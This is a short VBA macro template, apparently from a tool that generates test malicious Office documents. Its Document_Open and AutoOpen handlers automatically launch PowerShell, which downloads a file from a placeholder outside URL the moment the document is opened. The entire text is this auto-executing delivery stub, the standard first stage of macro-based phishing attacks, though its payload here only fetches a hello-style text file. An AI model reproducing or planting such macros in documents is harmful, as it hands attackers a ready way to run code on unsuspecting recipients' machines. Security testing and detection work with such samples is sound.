Sub {MACRO_NAME}()
    Dim str As String
    str = "powershell -NoExit -Command ""(New-Object System.Net.WebClient).DownloadString('{HTTP_URL}/___hello_from_vbaShell_via_http_client_via_PS___.txt')"" "
    Shell str, vbNormalFocus
End Sub

Sub Document_Open()
    {MACRO_NAME}
End Sub

Sub AutoOpen()
    {MACRO_NAME}
End Sub